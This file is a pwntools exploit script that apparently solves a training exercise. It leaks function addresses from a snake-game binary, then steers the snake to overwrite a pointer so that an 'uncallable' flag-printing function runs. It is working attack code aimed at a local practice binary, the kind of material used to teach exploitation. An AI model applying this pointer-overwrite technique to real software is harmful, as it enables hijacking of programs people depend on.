#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from advancedpwn import ida
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.binary = exe
context.log_level = "critical"
proxy = None

def signal_handler(signum, frame):
    global proxy
    if proxy is not None:
        proxy.exit_process()
        log.info("Killed IDA debugger window!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Add IDA killer to process kill

def get_addr(data):
    regex = r"good_bye\s*(\S*)\nuncallable (\S*)"
    reg = re.findall(regex, data)
    if len(reg) != 1:
        raise Exception("Didn't get one hit: {reg}")
    return reg[0]

def parse_snake(data_str):
    regex_snake = r"snake: (\S* \S*)"
    reg_snake = re.findall(regex_snake, data_str)
    return reg_snake[0]

def reached_len(data_str, len=44):
    regex_fruit = r"fruit: (\S* \S*)"
    regex_snake_len = r"snake length: (\S*)"
    reg_fruit = re.findall(regex_fruit, data_str)
    reg_snake_len = re.findall(regex_snake_len, data_str)
    reg_snake = parse_snake(data_str)
    try:
        if reg_fruit[0] not in reg_snake:
            return False
        return int(reg_snake_len[0]) == len
    except Exception as e:
        print(f"{data_str}")
        exit()

def exploitStart():
    global proxy
    r = context.binary.process()
    #proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    data_str = r.recvuntil(b"enter:").decode()
    bye_add, unc_add = get_addr(data_str)
    last_byte = int(unc_add[-2:], 16)
    while not reached_len(data_str):
        r.sendline(b"A")
        data_str = r.recvuntil(b"enter:").decode()
    cur_pos = parse_snake(data_str)
    regex_x_pos = r"\((\d*) "
    reg_pos = re.findall(regex_x_pos, cur_pos)
    reg_pos = int(reg_pos[0])
    move = last_byte - reg_pos
    print(f"Cur {cur_pos} with goal {last_byte} move {move}")
    # snake length is pointer to cat flag
    #r.sendline(b'A'*0x100)
    r.sendline(b'd'*move)
    r.sendline(b's'*250)
    #r.recvall(timeout=5)
    r.sendline(b'q')
    print(r.recvall(timeout=15).decode())
    
if __name__ == '__main__':
    exploitStart()